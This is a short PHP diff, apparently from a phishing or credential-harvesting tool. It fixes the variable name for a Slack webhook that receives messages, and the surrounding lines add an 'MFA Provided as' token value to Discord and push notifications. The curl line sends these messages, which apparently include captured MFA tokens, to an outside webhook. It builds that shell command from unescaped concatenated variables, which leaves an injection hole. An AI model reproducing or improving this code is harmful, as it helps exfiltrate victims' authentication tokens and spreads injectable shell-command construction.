@@ -491,7 +491,8 @@ $messagediscord = $messagediscord."\\n> MFA Provided as `".$MFAToken."`";
 $messagepush = $messagepush."\r\nMFA Provided as ".$MFAToken."";
 }
 
-if($SlackWebHook != ""){
+
+if($SlackIncomingWebhookURL != ""){
 
 // Execute Slack Incoming Webhook
 $cmd = 'curl -s -X POST --data-urlencode \'payload={"channel": "'.$slackchannel.'", "username": "'.$slackbotname.'", "text": "'.$message.'", "icon_emoji": "'.$slackemoji.'"}\' '.$SlackIncomingWebhookURL.'';
